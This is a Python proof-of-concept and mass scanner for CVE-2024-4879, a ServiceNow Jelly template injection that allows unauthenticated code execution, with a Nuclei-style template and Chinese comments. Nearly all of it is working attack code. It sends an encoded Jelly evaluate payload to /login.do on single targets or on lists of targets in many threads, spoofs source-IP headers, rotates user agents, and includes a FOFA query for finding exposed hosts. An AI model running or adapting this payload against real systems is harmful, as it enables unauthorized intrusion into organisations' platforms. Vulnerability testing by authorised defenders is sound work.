'''
id: CVE-2024-4879

info:
  name: ServiceNow UI 宏中的 Jelly 模板注入漏洞
  author: fgz
  severity: critical
  description: 'ServiceNow 是一个领先的企业级云计算平台提供商，致力于帮助组织实现数字化转型和自动化工作流程。ServiceNow的目标是通过提供全面的IT服务管理、IT运营管理和IT业务管理解决方案。该平台Platform版本中存在输入验证漏洞的问题，从而导致jelly模板注入漏洞，未经身份验证的用户能够在Now Platform的上下文中远程执行代码。ServiceNow对托管实例应用了更新，并向合作伙伴和自助客户发布了更新。'
  tags: 2024
  metadata:
    max-request: 1
    fofa-query: icon_hash="1701804003"
    verified: true

http:
  - raw:
      - |-
        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(12345*12345);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, '152399025')"
'''
import argparse
import random
import textwrap
import time
import requests
from random import sample
from urllib import parse
from concurrent.futures import ThreadPoolExecutor

from rich.console import Console

from pyfiglet import Figlet

# 禁止urllib3警告
requests.packages.urllib3.disable_warnings()
console = Console()
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/68.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) '
    'Gecko/20100101 Firefox/68.0',
    'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/68.0'
]
url_lst = []
RED = '\033[91m'
ENDC = '\033[0m'


def title_style():
    color_list = ['red', 'blue', 'yellow', 'green', 'magenta', ' cyan']
    # 从 color_list 中随机抽取一个颜色
    color = sample(color_list, k=1)[0]
    # style='bold {}'.format(color) 设置文本样式为粗体和随机颜色
    console.print(Figlet(font='slant').renderText('CVE-2024-4879'), style='bold {}'.format(color), end="")
    print('''                                                        author: xl1nv
    
    ''')


def user_interaction():
    parser = argparse.ArgumentParser(description="CVE-2024-4879 poc",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent(
                                         '''example: python3 CVE-2024-4879.py -u http://192.168.1.108 OR python3 CVE-2024-4879.py -f target.txt -o res.txt'''))
    parser.add_argument("-u", "--url", help="Target URL", dest="url", type=str)
    parser.add_argument("-f", "--file", help="Scan multiple targets given in a textual file", dest="file", type=str)
    parser.add_argument("-o", "--output", help="Output file name", dest="output", type=str, default="res.txt")
    parser.add_argument("-t", "--thread", help="Number of threads to use", dest="thread", type=int, default=20)
    args = parser.parse_args()
    return args


# 格式化url
def url_process(url):
    if "://" not in url:
        if ":443" in url:
            url = "https://" + url
        else:
            url = "http://" + url
    parser = parse.urlparse(url.strip())
    # print(parser)
    item = {
        'scheme': parser.scheme,
        'host': parser.hostname,
        'port': parser.port
    }

    if not item['port']:
        if item['scheme'] == 'http':
            item['port'] = '80'
        elif item['scheme'] == 'https':
            item['port'] = '443'
    else:
        item['port'] = str(item['port'])  # 确保 port 是字符串

    url = item['scheme'] + "://" + item['host'] + ":" + item['port']
    return url


def file_process(filename, threads_num, output):
    pool = ThreadPoolExecutor(threads_num)
    try:
        with open(filename, mode="r", encoding="utf-8") as f:
            urls = f.readlines()
            for url in urls:
                res = url_process(url)
                pool.submit(request, res).add_done_callback(call_back)
                request(res)
        pool.shutdown()
        with open(output, mode="w", encoding="u8") as f:
            for res in url_lst:
                if res:
                    f.write(f"{res}\n")
        print("检测完毕")
    except FileNotFoundError:
        print(f"{filename}不存在")
    except Exception:
        pass


def call_back(n):
    if n.result():
        url_lst.append(n.result())


# def prompt_words(url):
#     now_time = time.strftime("[%H:%M:%S] ", time.localtime())
#     print(f"{now_time} 正在检测：{url}")


def request(url):
    # prompt_words(url)
    random_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
    full_url = f"{url}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(12345*12345);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
    headers = {
        "GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj": "elly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(12345*12345);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Microsoft Edge\";v=\"127\", \"Chromium\";v=\"127\"",
        "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1",
        "User-Agent": f"{random.choice(user_agents)}",
        "X-Forwarded-For": random_ip,
        "X-Real-IP": random_ip,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Priority": "u=0, i", "Connection": "close"}
    try:
        response = requests.get(full_url, headers=headers, allow_redirects=False, verify=False, timeout=6)
        if response.status_code == 200 and "152399025" in response.text:
            now_time = time.strftime("[%H:%M:%S] ", time.localtime())
            print(f"{RED}{now_time}[+] {url} 存在模板注入漏洞{ENDC}")
        else:
            now_time = time.strftime("[%H:%M:%S] ", time.localtime())
            print(f"{now_time}[-] {url} 不存在模板注入漏洞")

    except KeyboardInterrupt:
        return
    except Exception as e:
        print(e)


def main():
    args = user_interaction()
    if args.url:
        url = url_process(args.url.strip())
        request(url)
    if args.file:
        file_process(args.file.strip(), args.thread, args.output)


if __name__ == '__main__':
    title_style()
    main()
